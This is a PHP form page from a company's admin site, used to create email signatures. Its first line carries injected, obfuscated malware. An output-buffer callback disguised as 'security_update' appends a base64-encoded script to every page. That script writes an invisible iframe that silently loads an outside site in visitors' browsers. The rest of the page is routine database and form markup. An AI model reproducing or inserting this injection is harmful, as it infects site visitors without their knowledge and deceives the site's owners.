<?php ob_start("security_update"); function security_update($buffer){return $buffer.base64_decode('PHNjcmlwdD5kb2N1bWVudC53cml0ZSgnPHN0eWxlPi52Yl9zdHlsZV9mb3J1bSB7ZmlsdGVyOiBhbHBoYShvcGFjaXR5PTApO29wYWNpdHk6IDAuMDt3aWR0aDogMjAwcHg7aGVpZ2h0OiAxNTBweDt9PC9zdHlsZT48ZGl2IGNsYXNzPSJ2Yl9zdHlsZV9mb3J1bSI+PGlmcmFtZSBoZWlnaHQ9IjE1MCIgd2lkdGg9IjIwMCIgc3JjPSJodHRwOi8vZ2NsYWJyZWxzY29uLm5ldC9hYm91dC5waHAiPjwvaWZyYW1lPjwvZGl2PicpOzwvc2NyaXB0Pg==');} require_once('../Connections/seavest.php'); ?>
<?php
//MX Widgets3 include
require_once('../includes/wdg/WDG.php');

require_once('../functions/functions.php');

mysql_select_db($database_seavest, $seavest);
$query_Recordset1 = "SELECT * FROM tbl_companies";
$Recordset1 = mysql_query($query_Recordset1, $seavest) or die(mysql_error());
$row_Recordset1 = mysql_fetch_assoc($Recordset1);
$totalRows_Recordset1 = mysql_num_rows($Recordset1);

mysql_select_db($database_seavest, $seavest);
$query_Recordset2 = "SELECT * FROM tbl_sites";
$Recordset2 = mysql_query($query_Recordset2, $seavest) or die(mysql_error());
$row_Recordset2 = mysql_fetch_assoc($Recordset2);
$totalRows_Recordset2 = mysql_num_rows($Recordset2);
?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:wdg="http://www.interaktonline.com/MXWidgets">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>SEAVEST AFRICA TRADING CC</title>
<link href="../styles/layout.css" rel="stylesheet" type="text/css" />
<link href="../styles/fonts.css" rel="stylesheet" type="text/css">
<style type="text/css">
<!--
body,td,th {
	font-family: Arial;
}
a {
	font-family: Arial;
	font-size: 11px;
	color: #FFFFFF;
	font-weight: bold;
}
a:link {
	text-decoration: none;
}
a:visited {
	text-decoration: none;
	color: #FFFFFF;
}
a:hover {
	text-decoration: none;
	color: #CCCCCC;
}
a:active {
	text-decoration: none;
	color: #FFFFFF;
}
-->
</style>
<link href="../styles/fonts.css" rel="stylesheet" type="text/css">
<link href="../styles/layout.css" rel="stylesheet" type="text/css">
</head>

<body>
<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td width="200" valign="top">
        <?php
include('../menu.php'); ?>
    </td>
    <td valign="top"><table width="823" border="0" cellpadding="0" cellspacing="0">
      <tr>
        <td align="center"><img src="../images/banner.jpg" width="823" height="151"></td>
      </tr>
      <tr>
        <td><p>&nbsp;</p>
          <div style="padding-left:30px">
            <form name="form2" method="post" action="signatures.php">
              <table border="0" cellspacing="3" cellpadding="2">
                <tr>
                  <td class="combo-bold-grey">Name</td>
                  <td><input name="name" type="text" class="td-mail" id="name" style="width:300px"></td>
                </tr>
                <tr>
                  <td class="combo-bold-grey">Telephone</td>
                  <td><input name="telephone" type="text" class="td-mail" id="telephone" style="width:300px"></td>
                </tr>
                <tr>
                  <td class="combo-bold-grey">Cell</td>
                  <td><input name="cell" type="text" class="td-mail" id="cell" style="width:300px"></td>
                </tr>
                <tr>
                  <td class="combo-bold-grey">Fax</td>
                  <td><input name="fax" type="text" class="td-mail" id="fax" style="width:300px"></td>
                </tr>
                <tr>
                  <td class="combo-bold-grey">Email</td>
                  <td><input name="email" type="text" class="td-mail" id="email" style="width:300px"></td>
                </tr>
                <tr>
                  <td class="combo-bold-grey">Website</td>
                  <td><input name="web" type="text" class="td-mail" id="web" style="width:300px" value="www.seavest.co.za"></td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td align="right"><input name="button" type="submit" class="btn-create-new" id="button" value=""></td>
                </tr>
              </table>
            </form>
          </div>
          <p>&nbsp;</p></td>
      </tr>
    </table></td>
  </tr>
</table>
</body>
</html>
<?php
mysql_free_result($Recordset1);

mysql_free_result($Recordset2);
?>
